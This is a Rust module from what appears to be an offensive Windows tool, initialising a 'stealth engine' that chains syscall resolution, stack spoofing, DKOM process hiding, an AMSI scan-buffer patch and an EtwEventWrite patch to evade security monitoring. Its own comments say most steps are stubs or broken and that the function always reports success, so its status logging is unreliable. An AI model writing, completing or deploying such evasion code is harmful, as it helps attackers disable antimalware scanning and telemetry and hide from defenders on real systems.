/*
** *********************************************************************
** *********************************************************************
**
**                              DISCLAIMER
**       For educational purposes only. 2026 All rights reversed.
**
** *********************************************************************
** *********************************************************************
*/

// stealth/mod.rs — stealth engine initialiser.
//
// Order: syscall resolver → lacuna → DKOM hide self → AMSI stomp → ETW patch.
// Always returns true even if every step no-ops.
//
// BROKEN: syscalls/DKOM are stubs; AMSI patch no-ops if amsi.dll is not loaded
// (typical for this native EXE). ETW patch is the only likely-real step.

pub mod syscalls;
pub mod lacuna;
pub mod dkom;   // ← was: `pub mod dkoms` (wrong name, compile error)
pub mod stomp;

use log::info;

/// Run the stealth chain. Return value is not a success indicator (always true).
pub fn initialize() -> bool {
    info!("Initialising enhanced stealth engine…");

    // 1. Direct / indirect syscall resolver.
    //    init() logs Tartarus as "active" because the stub returns true.
    syscalls::init();

    // 2. Stack spoofing via lacuna-rs.
    //    init() only logs; resolved SSNs are never used to issue syscalls.
    lacuna::init();

    // 3. Process hiding via DKOM / fallback chain.
    //    hide_process always fails (all methods return false).
    #[cfg(feature = "dkom")]
    dkom::hide_process(std::process::id());

    // 4. Module stomping: patch AMSI in-process so PowerShell bypass is
    //    inherited by any child PowerShell spawned later.
    //    BROKEN: amsi.dll usually not loaded here; child PS is a new process.
    stomp::stomp_module("amsi.dll", stomp::AMSI_SCAN_BUFFER_PATCH);

    // 5. ETW patching: neutralise EtwEventWrite to reduce kernel telemetry.
    stomp::patch_etw();

    true
}
